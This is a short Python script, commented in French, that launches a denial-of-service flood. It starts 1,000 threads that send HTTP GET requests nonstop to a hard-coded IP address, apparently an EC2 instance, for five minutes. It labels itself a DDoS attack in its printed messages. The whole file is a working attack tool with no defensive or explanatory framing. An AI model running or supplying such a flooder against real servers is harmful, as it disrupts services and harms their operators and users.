import requests
import threading
import time
import sys

# URL de la première instance EC2 Lin
target_url = "http://18.168.205.109"

# Nombre de threads à utiliser
num_threads = 1000

# Variable pour arrêter les threads
stop_threads = False

# Fonction pour envoyer les requêtes HTTP GET
def send_requests():
    while not stop_threads:
        print("attaque a l'adresse ",target_url)
        try:
            requests.get(target_url)
        except:
            print("requete echouée")
            pass

# Créer et lancer les threads
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=send_requests)
    t.start()
    threads.append(t)

# Laisser l'attaque DDoS fonctionner pendant 5 minutes
print("Lancement de l'attaque DDoS, veuillez patienter...")
try:
    time.sleep(300)
except KeyboardInterrupt:
    print("Arrêt de l'attaque DDoS par l'utilisateur.")

# Arrêter tous les threads
stop_threads = True
for t in threads:
    t.join()

print("Attaque DDoS terminée.")
sys.exit(0)
